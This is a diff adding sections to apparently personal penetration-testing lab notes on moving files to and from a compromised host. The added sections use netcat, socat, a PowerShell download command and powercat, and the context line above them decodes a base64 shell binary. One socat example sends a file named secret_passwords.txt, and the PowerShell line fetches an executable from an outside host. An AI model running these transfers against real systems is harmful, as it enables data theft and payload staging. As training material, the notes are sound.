@@ -26,4 +26,36 @@ lojique@htb[/htb]$ base64 shell -w 0
 user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA...SNIO...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
 ```
 
-\
+## Netcat
+
+```bash
+# to receive a file
+nc -nlvp 4444 > incoming.exe
+# to transfer a file
+nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
+```
+
+## Socat
+
+```bash
+# to transfer
+sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
+# to receive
+socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
+```
+
+## PowerShell
+
+```
+# download a file
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
+```
+
+## Powercat
+
+```
+# listener
+sudo nc -lnvp 443 > receiving_powercat.ps1
+# send a file
+powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
+```
